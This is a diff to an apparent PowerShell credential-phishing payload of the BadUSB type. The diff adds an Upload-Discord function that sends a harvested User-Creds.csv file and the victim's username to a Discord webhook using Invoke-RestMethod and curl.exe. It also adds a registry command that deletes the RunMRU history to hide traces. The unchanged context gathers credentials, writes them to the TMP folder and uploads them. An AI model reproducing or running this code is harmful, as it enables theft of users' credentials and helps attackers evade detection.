@@ -1,10 +1,9 @@
 
 
-#------------------------------------------------------------------------------------------------------------------------------------
 
 $FileName = "User-Creds.csv"
  
-#------------------------------------------------------------------------------------------------------------------------------------
+
 
 
 function Get-Creds {
@@ -23,7 +22,32 @@ return $creds
 
 }
 
-#----------------------------------------------------------------------------------------------------
+
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = 'YOUR-DISCORD-WEBHOOK'
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+
 
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
@@ -41,7 +65,7 @@ $o=New-Object -ComObject WScript.Shell
     }
 }
 
-#----------------------------------------------------------------------------------------------------
+
 
 function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
@@ -57,7 +81,6 @@ $key.SendKeys('{CapsLock}')
 
 
 
-#----------------------------------------------------------------------------------------------------
 
 
 Pause-Script
@@ -70,11 +93,17 @@ Add-Type -AssemblyName System.Windows.Forms
 
 $creds = Get-Creds
 
-#------------------------------------------------------------------------------------------------------------------------------------
+
 
 echo $creds >> $env:TMP\$FileName
 
 Upload-discord -file "User-Creds.csv"
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+
+
+
 
 
 
